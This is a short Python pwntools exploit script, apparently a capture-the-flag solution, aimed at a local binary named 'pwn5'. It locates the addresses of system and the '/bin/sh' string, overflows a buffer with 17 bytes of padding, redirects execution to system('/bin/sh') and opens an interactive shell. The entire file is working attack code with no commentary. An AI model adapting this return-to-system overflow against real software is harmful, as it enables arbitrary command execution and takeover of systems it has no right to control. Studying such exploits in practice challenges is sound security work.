from pwn import *

e = ELF('./pwn5')
p = process('./pwn5')

system_addr = e.symbols['system']
binsh_addr = next(e.search('/bin/sh'))

print "system: " + hex(system_addr)
print "/bin/sh: " + hex(binsh_addr)

payload = 'A' * 17
payload += p32(system_addr)
payload += 'AAAA'
payload += p32(binsh_addr)

p.sendline(payload)
p.interactive()